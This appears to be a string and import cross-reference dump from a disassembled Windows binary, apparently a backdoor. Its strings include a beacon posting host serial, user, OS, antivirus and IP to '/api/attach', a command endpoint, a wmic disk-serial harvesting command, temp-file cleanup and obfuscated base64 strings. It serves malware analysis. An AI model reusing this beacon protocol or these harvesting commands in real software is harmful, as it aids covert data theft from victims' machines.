reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x404040	0x44a008	import	0x404030	KERNEL32.dll.HeapFree
0x40407f	0x44a034	import	0x404050	KERNEL32.dll.HeapReAlloc
0x40409b	0x44a018	import	0x404090	KERNEL32.dll.HeapSize
0x4040ca	0x44a050	import	0x4040b0	KERNEL32.dll.HeapDestroy
0x404d50	0x44a19c	import	0x404d20	WINHTTP.dll.WinHttpCloseHandle
0x4052d5	0x456994	string	0x405230	POST
0x4052f2	0x456994	string	0x405230	POST
0x405322	0x405326	string	0x405230	jjjj
0x40532f	0x44a1b0	import	0x405230	WINHTTP.dll.WinHttpOpen
0x40533b	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x405360	0x44a198	import	0x405230	WINHTTP.dll.WinHttpSetTimeouts
0x405421	0x44a1a0	import	0x405230	WINHTTP.dll.WinHttpCrackUrl
0x405470	0x44a1b8	import	0x405230	WINHTTP.dll.WinHttpConnect
0x4054b8	0x44a1c0	import	0x405230	WINHTTP.dll.WinHttpOpenRequest
0x4054f3	0x44a1b4	import	0x405230	WINHTTP.dll.WinHttpSetOption
0x405535	0x44a1ac	import	0x405230	WINHTTP.dll.WinHttpAddRequestHeaders
0x40553f	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x405566	0x4569a0	string	0x405230	Cookie:
0x4055d3	0x44a1ac	import	0x405230	WINHTTP.dll.WinHttpAddRequestHeaders
0x4055dd	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x405634	0x40572b	string	0x405230	jjjjjj
0x40569f	0x44a1b4	import	0x405230	WINHTTP.dll.WinHttpSetOption
0x4056a9	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x4056bd	0x40572b	string	0x405230	jjjjjj
0x4056da	0x44a1b4	import	0x405230	WINHTTP.dll.WinHttpSetOption
0x4056e4	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x4056f8	0x40572b	string	0x405230	jjjjjj
0x405715	0x44a1b4	import	0x405230	WINHTTP.dll.WinHttpSetOption
0x40571d	0x40572b	string	0x405230	jjjjjj
0x40571f	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x40573f	0x44a1c4	import	0x405230	WINHTTP.dll.WinHttpSendRequest
0x40575e	0x44a188	import	0x405230	WINHTTP.dll.WinHttpGetIEProxyConfigForCurrentUser
0x4057e4	0x44a18c	import	0x405230	WINHTTP.dll.WinHttpGetProxyForUrl
0x4057fe	0x44a1b4	import	0x405230	WINHTTP.dll.WinHttpSetOption
0x405815	0x44a1c4	import	0x405230	WINHTTP.dll.WinHttpSendRequest
0x40583a	0x44a030	import	0x405230	KERNEL32.dll.GlobalFree
0x405903	0x44a1b4	import	0x405230	WINHTTP.dll.WinHttpSetOption
0x40590d	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x40591f	0x44a030	import	0x405230	KERNEL32.dll.GlobalFree
0x405944	0x44a030	import	0x405230	KERNEL32.dll.GlobalFree
0x405986	0x44a190	import	0x405230	WINHTTP.dll.WinHttpWriteData
0x405990	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x40599f	0x44a1bc	import	0x405230	WINHTTP.dll.WinHttpReceiveResponse
0x4059c7	0x44a1a8	import	0x405230	WINHTTP.dll.WinHttpQueryHeaders
0x4059d1	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x405a2c	0x44a1a8	import	0x405230	WINHTTP.dll.WinHttpQueryHeaders
0x405abf	0x4569b4	string	0x405230	charset={[A-Za-z0-9\-_]+}
0x405b22	0x4569e8	string	0x405230	Content-Length: {[0-9]+}
0x405b82	0x456a1c	string	0x405230	Location: {[0-9]+}
0x405be8	0x456a44	string	0x405230	Set-Cookie:\b*{.+?}\n
0x405f31	0x44a1a8	import	0x405230	WINHTTP.dll.WinHttpQueryHeaders
0x405f3b	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x405f8c	0x44a1a8	import	0x405230	WINHTTP.dll.WinHttpQueryHeaders
0x406037	0x44a1a4	import	0x405230	WINHTTP.dll.WinHttpQueryDataAvailable
0x4060e5	0x44a194	import	0x405230	WINHTTP.dll.WinHttpReadData
0x40618a	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x40625b	0x44a01c	import	0x405230	KERNEL32.dll.MultiByteToWideChar
0x406291	0x44a01c	import	0x405230	KERNEL32.dll.MultiByteToWideChar
0x4062f0	0x44a01c	import	0x405230	KERNEL32.dll.MultiByteToWideChar
0x406375	0x456a88	string	0x405230	{<html>}
0x4063f0	0x456a9c	string	0x405230	{</html>}
0x406575	0x44a024	import	0x405230	KERNEL32.dll.GetLastError
0x40659c	0x44a19c	import	0x405230	WINHTTP.dll.WinHttpCloseHandle
0x4065a8	0x44a19c	import	0x405230	WINHTTP.dll.WinHttpCloseHandle
0x406b78	0x406b8e	string	0x406a20	3ҍZ? blocks=Basic Latin,Cyrillic
0x406d66	0x44a060	import	0x406d50	KERNEL32.dll.SleepEx
0x407776	0x456ca8	string	0x4076a0	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
0x407bad	0x456d44	string	0x407a30	Content-Length:
0x407be2	0x456d68	string	0x407a30	\r\nContent-Type: application/x-www-form-urlencoded\r\n
0x407c3f	0x456994	string	0x407a30	POST
0x407cc1	0x456ca8	string	0x407a30	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
0x40851e	0x456dd0	string	0x4082e0	domain
0x4088dd	0x456e14	string	0x408770	serial=
0x40892c	0x456e0c	string	0x408770	&name=
0x40899b	0x456df0	string	0x408770	&user_token=8723478873487
0x4089e7	0x456de8	string	0x408770	&os=
0x408a56	0x456de0	string	0x408770	&anti=
0x408ace	0x456dd8	string	0x408770	&ip=
0x40923d	0x456e1c	string	0x408770	/api/attach
0x409313	0x456e28	string	0x408770	token
0x409553	0x456e1c	string	0x408770	/api/attach
0x4097b9	0x456e30	string	0x409750	/api/req/res
0x409800	0x456e54	string	0x409750	token=
0x409816	0x456e4c	string	0x409750	&id=
0x4098a4	0x456e40	string	0x409750	&response=
0x409d3a	0x44a180	import	0x409ce0	SHELL32.dll.ShellExecuteExW
0x409d45	0x44a014	import	0x409ce0	KERNEL32.dll.WaitForSingleObject
0x40a27d	0x456e5c	string	0x40a230	0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghilmnopqrstuvmxyz
0x40af0c	0x456ea0	string	0x40ae20	aSwpEHc0QyIxPRAqNmkeEwskMW8HODkkYRkCICIrJysHNmtlIzQiChMiGAxzQg==
0x40afc0	0x456ee4	string	0x40ae20	\tempu.txt'
0x40afd5	0x456ee4	string	0x40ae20	\tempu.txt'
0x40b0ab	0x456ef0	string	0x40ae20	\tempu.txt
0x40b0c0	0x456ef0	string	0x40ae20	\tempu.txt
0x40b14f	0x44a060	import	0x40ae20	KERNEL32.dll.SleepEx
0x40b171	0x456ef0	string	0x40ae20	\tempu.txt
0x40b186	0x456ef0	string	0x40ae20	\tempu.txt
0x40b1ad	0x44a02c	import	0x40ae20	KERNEL32.dll.DeleteFileW
0x40b5a5	0x456f00	string	0x40b450	KiwzCywiEDtjHAQzfg8LXyFxaAcvMjolKFogbmYAJiQIJCc2QHFj
0x40b659	0x456f38	string	0x40b450	\temps2.txt'
0x40b66e	0x456f38	string	0x40b450	\temps2.txt'
0x40b69b	0x456f48	string	0x40b450	\temps1.txt' ; wmic path win32_physicalmedia get SerialNumber | Out-File -Encoding 'Default' '
0x40b6b0	0x456f48	string	0x40b450	\temps1.txt' ; wmic path win32_physicalmedia get SerialNumber | Out-File -Encoding 'Default' '
0x40b80b	0x456fa8	string	0x40b450	\temps1.txt
0x40b820	0x456fa8	string	0x40b450	\temps1.txt
0x40b96f	0x456fbc	string	0x40b450	\temps2.txt
0x40b984	0x456fbc	string	0x40b450	\temps2.txt
0x40ba1d	0x456fc8	string	0x40b450	SerialNumber
0x40ba80	0x44a060	import	0x40b450	KERNEL32.dll.SleepEx
0x40baa2	0x456fa8	string	0x40b450	\temps1.txt
0x40bab7	0x456fa8	string	0x40b450	\temps1.txt
0x40bad9	0x44a02c	import	0x40b450	KERNEL32.dll.DeleteFileW
0x40bb34	0x44a060	import	0x40b450	KERNEL32.dll.SleepEx
0x40bb56	0x456fbc	string	0x40b450	\temps2.txt
0x40bb6b	0x456fbc	string	0x40b450	\temps2.txt
0x40be36	0x40bea0	string	0x40b450	h[gE
0x40c0d4	0x456ff0	string	0x40bfc0	YipnESAoU2cMAFEgNj1CcCUhMSsuP3lhAmcDGCQ2MCsGP2diKAIFGQUmBV82BkMfH1JfZwUXISA8HzgTZ3UaUhowElVWC1o=
0x40c19e	0x457054	string	0x40bfc0	\tempo2.txt"
0x40c1b3	0x457054	string	0x40bfc0	\tempo2.txt"
0x40c1e0	0x457064	string	0x40bfc0	\tempo1.txt" > "
0x40c1f5	0x457064	string	0x40bfc0	\tempo1.txt" > "
0x40c222	0x457078	string	0x40bfc0	\tempo1.txt" && type "
0x40c237	0x457078	string	0x40bfc0	\tempo1.txt" && type "
0x40c429	0x457090	string	0x40bfc0	\tempo2.txt
0x40c43e	0x457090	string	0x40bfc0	\tempo2.txt
0x40c6e6	0x44a060	import	0x40bfc0	KERNEL32.dll.SleepEx
0x40c708	0x4570a4	string	0x40bfc0	\tempo1.txt
0x40c71d	0x4570a4	string	0x40bfc0	\tempo1.txt
0x40c73f	0x44a02c	import	0x40bfc0	KERNEL32.dll.DeleteFileW
0x40c79a	0x44a060	import	0x40bfc0	KERNEL32.dll.SleepEx
0x40c7bc	0x457090	string	0x40bfc0	\tempo2.txt
0x40c7d1	0x457090	string	0x40bfc0	\tempo2.txt
0x40ca16	0x40ca83	string	0x40bfc0	h[gE
0x40cc94	0x4570b8	string	0x40cb80	YipnESAoU2ctOhIkPCcEWiNxMiokIzBhZn0XCy8lIS4MNWt/RwU2HgNpTEw2ERcDHVYXIyEXICB1TnYR
0x40cd53	0x45710c	string	0x40cb80	\tempi2.txt"
0x40cd68	0x45710c	string	0x40cb80	\tempi2.txt"
0x40cd95	0x45711c	string	0x40cb80	\tempi1.txt" > "
0x40cdaa	0x45711c	string	0x40cb80	\tempi1.txt" > "
0x40cdd7	0x457130	string	0x40cb80	\tempi1.txt" && type "
0x40cdec	0x457130	string	0x40cb80	\tempi1.txt" && type "
0x40cfe4	0x457148	string	0x40cb80	\tempi2.txt
0x40cff9	0x457148	string	0x40cb80	\tempi2.txt
0x40d0c4	0x457154	string	0x40cb80	IPAddress
0x40d0ee	0x457154	string	0x40cb80	IPAddress
0x40d1b2	0x45695c	string	0x40cb80	, "\r\n
0x40d2d1	0x44a060	import	0x40cb80	KERNEL32.dll.SleepEx
0x40d2f3	0x457170	string	0x40cb80	\tempi1.txt
0x40d308	0x457170	string	0x40cb80	\tempi1.txt
0x40d32f	0x44a02c	import	0x40cb80	KERNEL32.dll.DeleteFileW
0x40d383	0x44a060	import	0x40cb80	KERNEL32.dll.SleepEx
0x40d3a5	0x457148	string	0x40cb80	\tempi2.txt
0x40d3ba	0x457148	string	0x40cb80	\tempi2.txt
0x40d3e1	0x44a02c	import	0x40cb80	KERNEL32.dll.DeleteFileW
0x40d5fb	0x40d669	string	0x40cb80	h[gE
0x40d879	0x44a01c	import	0x40d750	KERNEL32.dll.MultiByteToWideChar
0x40d8bb	0x44a01c	import	0x40d750	KERNEL32.dll.MultiByteToWideChar
0x40d90a	0x457180	string	0x40d750	_sn_random
0x40d931	0x45718c	string	0x40d750	_us_random
0x40dc0d	0x40dc17	string	0x40da40	h[gE
0x40dc47	0x457180	string	0x40da40	_sn_random
0x40dc6e	0x45718c	string	0x40da40	_us_random
0x40de6a	0x4571cc	string	0x40da40	{ "sn":"
0x40dead	0x4571c0	string	0x40da40	","us":"
0x40df07	0x4571b4	string	0x40da40	","os":"
0x40df61	0x4571a8	string	0x40da40	","av":"
0x40dfbe	0x45719c	string	0x40da40	","ip":"
0x40ece9	0x44a1d4	import	0x40ec90	ole32.dll.CoInitialize
0x40ed08	0x44a1cc	import	0x40ec90	ole32.dll.CoCreateInstance
0x40eee7	0x44a1d0	import	0x40ec90	ole32.dll.CoUninitialize
0x40efdd	0x4571dc	string	0x40eef0	.zip
0x40eff2	0x4571dc	string	0x40eef0	.zip
0x40f18d	0x44a000	import	0x40eef0	KERNEL32.dll.CreateDirectoryW
0x40f235	0x44a174	import	0x40eef0	OLEAUT32.dll.SysReAllocStringLen
0x40f27f	0x44a060	import	0x40eef0	KERNEL32.dll.SleepEx
0x40f288	0x44a02c	import	0x40eef0	KERNEL32.dll.DeleteFileW
0x40f2d5	0x4571e4	string	0x40eef0	IjkiCA==
0x40f32b	0x4571f0	string	0x40eef0	Pj0mFDk=
0x40f81e	0x457238	string	0x40f770	> "
0x40f8ca	0x457220	string	0x40f770	\txc1.txt" && type "
0x40f971	0x457210	string	0x40f770	\txc1.txt" > "
0x40f9fe	0x457204	string	0x40f770	\txc2.txt"
0x40fd4a	0x457244	string	0x40f770	\txc2.txt
0x40fd62	0x457244	string	0x40f770	\txc2.txt
0x40fdde	0x457250	string	0x40f770	\txc1.txt
0x40fdf6	0x457250	string	0x40f770	\txc1.txt
0x40fe21	0x44a02c	import	0x40f770	KERNEL32.dll.DeleteFileW
0x40fe8b	0x457244	string	0x40f770	\txc2.txt
0x40fea3	0x457244	string	0x40f770	\txc2.txt
0x4100da	0x44a00c	import	0x410090	KERNEL32.dll.GetModuleFileNameW
0x4101b6	0x44a060	import	0x410090	KERNEL32.dll.SleepEx
0x410477	0x44a000	import	0x410090	KERNEL32.dll.CreateDirectoryW
0x410778	0x44a060	import	0x410090	KERNEL32.dll.SleepEx
0x410785	0x4571e4	string	0x410090	IjkiCA==
0x410820	0x44a17c	import	0x410090	SHELL32.dll.ShellExecuteW
0x410a2a	0x457270	string	0x4109a0	type
0x410a4c	0x457270	string	0x4109a0	type
0x410ac8	0x457284	string	0x4109a0	name
0x410cea	0x45728c	string	0x4109a0	{"status":"success"}
0x410d12	0x4572a4	string	0x4109a0	{"status":"exception"}
0x410f74	0x4572bc	string	0x4109a0	{"status":"success","result":"
0x41105c	0x4572dc	string	0x4109a0	remove_reg
0x41106d	0x457284	string	0x4109a0	name
0x4110a4	0x4572e8	string	0x4109a0	exit
0x41136d	0x44a060	import	0x411330	KERNEL32.dll.SleepEx
0x4113d7	0x44a000	import	0x411330	KERNEL32.dll.CreateDirectoryW
0x411487	0x4572f0	string	0x411330	YipnNAgGEAYHF1EPGAo3bxceAxYWEAcEHXkuLTMrMC0PJRcVDj8gBBE9MGgmF0UPA0MlIiEBOjw7LARGJnVDZQ==
0x4115a3	0x45734c	string	0x411330	Yj1nNAgGbxQZc14D
0x411659	0x457360	string	0x411330	Yyw/Aw==
0x411752	0x45736c	string	0x411330	" /F
0x411766	0x44a01c	import	0x411330	KERNEL32.dll.MultiByteToWideChar
0x411776	0x45736c	string	0x411330	" /F
